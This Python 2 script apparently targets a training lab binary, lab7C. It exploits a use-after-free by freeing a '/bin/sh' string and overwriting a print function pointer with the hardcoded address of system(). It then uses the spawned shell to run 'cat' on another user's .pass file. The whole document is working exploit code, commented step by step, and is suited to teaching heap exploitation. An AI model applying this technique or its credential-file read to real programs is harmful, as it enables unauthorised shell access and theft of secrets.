import subprocess

def read_until(process, needle):
        output = ""
        while needle not in output:
                output += process.stdout.read(1)

        return output
def main():
        sp = subprocess.Popen("/levels/lab07/./lab7C", stdin=subprocess.PIPE, stdout=subprocess.PIPE) #create subprocess to interact with program

        #print the menu
        print read_until(sp, "Enter Choice: ")

        #Create a string on the heap that we will later free
        #We use /bin/sh as when we trigger the uaf this string will be stored in EDX
        sp.stdin.write("1\n")
        sp.stdin.write("/bin/sh\n")


        #Delete the string we just created
        #This calls free() on our string struct, causing a dangling pointer
        sp.stdin.write("3\n")

        #Create a number struct
        #This overwrites the print function pointer with whatever number we input
        #system() is @ 0xb7e63190 which is  3085316496 in decimal
        sp.stdin.write("2\n")
        sp.stdin.write("3085316496\n")


        print "[+] Launching Shell [+]"
        print sp.pid
        #Pause before launching exploit
        input = raw_input()
        #Call print string, this causes a call to system(EDX) where EDX="/bin/sh"
        sp.stdin.write("5\n")
        sp.stdin.write("1\n") #print string at index 1

        read_until(sp, "String index to print: ") #Needed to flush output stream for some reason

        sp.stdin.write("cat /home/lab7A/.pass\n") #lets grab the flag
        print "[+] Getting the Flag [+] " + sp.stdout.readline()


if __name__ == '__main__':
        main()
